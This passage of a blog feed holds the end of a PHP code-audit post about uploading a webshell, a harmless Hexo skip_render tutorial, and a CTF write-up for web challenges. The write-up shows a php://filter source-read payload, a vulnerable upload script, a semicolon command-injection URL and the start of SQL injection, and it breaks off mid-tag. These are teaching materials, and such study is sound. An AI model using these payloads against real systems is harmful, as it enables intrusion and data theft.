src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420194933834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而且我发现，上传的木马跟图片的名字是一样的，也就是说你只需要更改上传图片的后缀名即可，这个系统对上传的文件名进行了更改处理，这样一来也不需要去分析上传的时间了！<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020042019503215.png" alt="在这里插入图片描述"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020042019503811.png" alt="在这里插入图片描述"><br>蚁剑连接：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200420195053984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>注：本文仅供参考学习，请勿在网上搞破坏，触犯法律者应承担相应的法律责任！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 0day </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Exp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo之渲染绕过</title>
      <link href="/posts/17fd92ae.html"/>
      <url>/posts/17fd92ae.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x001-Hexo-渲染"><a href="#0x001-Hexo-渲染" class="headerlink" title="0x001 Hexo 渲染"></a>0x001 Hexo 渲染</h3><p>  在Hexo部署时会默认渲染source下的所有html页面，但有时候想在Hexo博客上单独自定义html页面或README.md时，却不希望被Hexo渲染。因此对某个文件或者目录进行排除渲染是非常必要的。</p><h3 id="0x002-方法一：font-matter"><a href="#0x002-方法一：font-matter" class="headerlink" title="0x002 方法一：font matter"></a>0x002 方法一：font matter</h3><p><code>Hexo</code>新建网站页面，然后将你的代码直接写入 <code>index.md</code> 中</p><p>在 <code>Front matter</code> 中添加 <code>layout: false</code>，此方法适用于单一的纯<code>HTML</code><br><code>CSS</code> 页面。</p><pre class="line-numbers language-bash"><code class="language-bash">---title: toolsdate: 2020-04-28 00:00:00type: <span class="token string">"tools"</span>layout: <span class="token boolean">false</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x003-方法二：skip-render"><a href="#0x003-方法二：skip-render" class="headerlink" title="0x003 方法二：skip render"></a>0x003 方法二：skip render</h3><p>在博客根目录下的 <code>_config.yml</code>，找到 <code>skip_render</code>，大概在32行左右，写入你想要的跳过渲染的路径，注意缩进和空格。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 指定目录跳过hexo渲染</span>skip_render:  - <span class="token string">'tools/*'</span>  - <span class="token string">'tools/**'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注释：<code>tools/*</code> 表示在目录 <code>source/fireworks</code> 下的文件全部跳过渲染，<code>tools/**</code> 表示在博客根目录 <code>source/tools/</code> 文件夹下的文件全部跳过渲染（例如页面的 js、css 在另一个文件夹中）。</p></blockquote><h3 id="0x004-案例：webstack-导航"><a href="#0x004-案例：webstack-导航" class="headerlink" title="0x004 案例：webstack 导航"></a>0x004 案例：webstack 导航</h3><p><code>webstack</code>是一个纯静态的网址导航网站，内容均由<code>viggo</code>收集并整理。项目基于<code>bootstrap</code>前端框架开发。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://camo.githubusercontent.com/41111c4c1d9922982f380566e6a2f8415204c52c/687474703a2f2f7777772e776562737461636b2e63632f6173736574732f696d616765732f707265766965772e676966" alt="image"></p><ul><li>Github：<a href="https://github.com/WebStackPage/WebStackPage.github.io" target="_blank" rel="noopener">https://github.com/WebStackPage/WebStackPage.github.io</a></li></ul><p>在博客根目录 <code>source/</code>下新建<code>tools</code>，然后新建<code>index.html</code>,将<code>webstack</code>网页源码全选复制粘贴到里面。</p><ul><li>本站的webstack源码：<a href="view-source:http://luckyzmj.cn/tools/" target="_blank" rel="noopener">view-source:http://luckyzmj.cn/tools/</a></li></ul><blockquote><p>注意：将源码里的部分信息以及跳转链接按照你真实个人博客的环境进行修改。</p></blockquote><p>然后打开博客根目录下配置文件<code>_config.yml</code>，找到<code>skip_render</code>，做如下修改：</p><pre class="line-numbers language-bash"><code class="language-bash">skip_render:  - <span class="token string">'tools/*'</span>  - <span class="token string">'tools/**'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后执行<code>hexo clean</code>和<code>hexo s -g</code>本地预览，检查无误后<code>hexo g -d</code>部署到服务器上即可。</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul><li><a href="https://xiabor.com/2020/04/21/hexo3/#%E5%A6%82%E4%BD%95%E8%B7%B3%E8%BF%87hexo%E7%9A%84%E6%B8%B2%E6%9F%93" target="_blank" rel="noopener">https://xiabor.com/2020/04/21/hexo3/#%E5%A6%82%E4%BD%95%E8%B7%B3%E8%BF%87hexo%E7%9A%84%E6%B8%B2%E6%9F%93</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 博客篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 渲染绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届山东新一代信息安全攻防赛——Web题目wp</title>
      <link href="/posts/d067edb.html"/>
      <url>/posts/d067edb.html</url>
      
        <content type="html"><![CDATA[<h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>这道题的思路就是文件包含加代码审计，最后文件上传。</p><p>先来扫一下目录<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111909243968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>访问/static，有目录遍历<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119092924205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">看一下upload.js的源码：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> fileName <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#file_name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> fileContent <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#file_content'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            url<span class="token punctuation">:</span> <span class="token string">"/upload.php"</span><span class="token punctuation">,</span>            method<span class="token punctuation">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>            data<span class="token punctuation">:</span> <span class="token punctuation">{</span>filename<span class="token punctuation">:</span> fileName<span class="token punctuation">,</span> filecontent<span class="token punctuation">:</span> fileContent<span class="token punctuation">}</span><span class="token punctuation">,</span>            success<span class="token punctuation">:</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">,</span> status<span class="token punctuation">)</span> <span class="token punctuation">{</span>                result <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> notice <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'&lt;div class="alert m-5" role="alert">'</span> <span class="token operator">+</span> result<span class="token punctuation">[</span><span class="token string">"info"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token string">"state"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    notice<span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"alert-success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span>                    notice<span class="token punctuation">.</span><span class="token function">addClass</span><span class="token punctuation">(</span><span class="token string">"alert-danger"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'div.alert'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'div.alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'form.m-5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">before</span><span class="token punctuation">(</span>notice<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问index.php，有文件包含<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119093403296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用php伪协议进行文件内容读取upload.php的源码</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//47.105.128.249:36001/f.php?f=php://filter/read=convert.base64-encode/resource=upload.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 判断filename是否为空</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"è¯·ä¸ä¼ txtæ ¼å¼æä»¶"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 若不为空变量file_name等于POST的filename</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 过滤.php后缀的文件</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span> <span class="token operator">==</span> <span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"æä»¶åéæ³ï¼"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_name</span> <span class="token operator">===</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"è¦ä¼ å¥½å¥½ä¼ ï¼å«æå"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># 上传路径</span>    <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token string">'./Uploads/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 文件内容</span>    <span class="token variable">$fileContent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filecontent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 过滤eval</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fileContent</span><span class="token punctuation">,</span><span class="token string">'eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"æ£æµå°æ¶æä»£ç ï¼ç¦æ­¢ä¸ä¼ ï¼"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># 过滤assert</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$fileContent</span><span class="token punctuation">,</span><span class="token string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"æ£æµå°æ¶æä»£ç ï¼ç¦æ­¢ä¸ä¼ ï¼"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span> <span class="token variable">$fileContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span> <span class="token variable">$fileContent</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'state'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'æä»¶ä¿å­è³'</span><span class="token punctuation">.</span><span class="token variable">$file_path</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读完源码思路就有了，直接在upload.php页面POST数据就行了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111910390756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>成功上传：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119103936210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>执行命令：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119104229186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>获取flag：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119104635742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>螳螂捕蝉，黄雀在后。它既然存在目录遍历，那我们等着就行了，刷新页面，看看那些木马上传成功了，然后利用文件包含，看一下源码，借用一下别人的马也是可以的。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119105027865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>包含一下：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119105250111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><h5 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h5><p>访问Web2的页面上来就给了一段代码，分析一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># 定义变量target接收url传值</span><span class="token variable">$target</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 定义变量cmd接收ping -c 2 +target的执行返回结果</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string">'ping -c 2 '</span><span class="token punctuation">.</span><span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 输出cmd</span><span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 高亮显示文件内容</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>很明显是一个命令执行，它这里应该是过滤了 &amp; ，我们用 ; 构造payload:</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//47.105.128.249:35002/index.php?target=127.0.0.1;echo%20666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119140556188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>成功执行，那么就找一下flag文件：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//47.105.128.249:35002/index.php?target=127.0.0.1;find%20/%20-name%20*flag*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119140717528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>获得flag：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119140816549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><h5 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119141246891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><p>这道题的提示是sqli，那就注入吧，从它的注册页面下手，这道题最狗的就是它的回显内容，你得登录以后才能显示在<strong>年龄</strong>上，先来判断字段长度：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201119145204986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>长度为4<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 